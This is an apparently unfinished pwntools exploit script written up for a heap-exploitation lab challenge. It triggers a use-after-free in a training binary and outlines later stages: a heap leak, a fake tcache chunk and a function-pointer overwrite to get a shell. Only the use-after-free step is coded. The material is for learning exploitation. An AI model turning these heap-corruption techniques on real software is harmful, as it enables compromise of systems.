#!/usr/bin/env python3
'''
Tcache Fake Fd Challenge writeup:
- Run on GLibC version 2.26 & 2.29
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.26/libc-2.26.so'
env = {}

# Binary setup
elf_name = '.happy-2.26'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug([elf.path], env = env, gdbscript='''
dir ../../../libc_versions/2.26/
''') 

else: 
	p = remote(domain, port) 

def create_kid(name, age):
	p.sendlineafter(">", "1") 

	# Send the name
	p.sendlineafter(":", name)

	# Send the age
	p.sendlineafter(":", str(age))
	return 

def edit_kid(index, name, age):
	p.sendlineafter(">", "4" )
	
	# Send the index 
	p.sendlineafter(":", str(index))
	# Send the name
	p.sendlineafter(":", name)
	# Send the age
	p.sendlineafter(":", str(age))
	return 

def free_kid(index):
	p.sendlineafter(">", "3") 

	# The index of the kid to free
	p.sendlineafter(":",str(index))

def view_kid(index): 
	p.sendlineafter(">", "2") 

	# Send the index to view
	p.sendlineafter(":", str(index))

	# Read the name
	p.recvuntil(":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(":")  
	age = p.recvline() 
	return name, age 

def uaf():
	'''
	The main vulnerability is a use-after-free for the kids in the array. 
	This same vulnerability can also be used for a double free scenario.

	With the use after free, we can do the following things: 
	- double free a kid (house of botcake technique) 
	- print the attributes of a kid 
	- edit the kid
	'''

	# Create one kid
	create_kid("Kid#1", 5) # Index 0: Use for UAF later

	# Free the kid. UAF has been triggered
	free_kid(0) # Decrement the 'counter' to 1

	# Operate on the freed kid at index 0
	# Check the tcache bins in malloc after this point
	edit_kid(0, "Mr. Hackerman", 0x42424242) 

def heap_leak():
	print("Step 1: heap leak")
	print("=================")
	'''
	The main vulnerability is a use-after-free for the kids in the array. 
	This same vulnerability can also be used for a double free scenario.

	With the use after free, we can do the following things: 
	- double free a kid (house of botcake technique) 
	- print the attributes of a kid 
	- edit the kid
	'''
	pass

''' 
Stages: 

1. Find the vulnerability <------- finished this!
2. Heap Leak <--- Next Step
3. Setup fake chunk in TCache
4. Overwrite function pointer to pop shell
'''

uaf()
leak = heap_leak()


p.interactive()

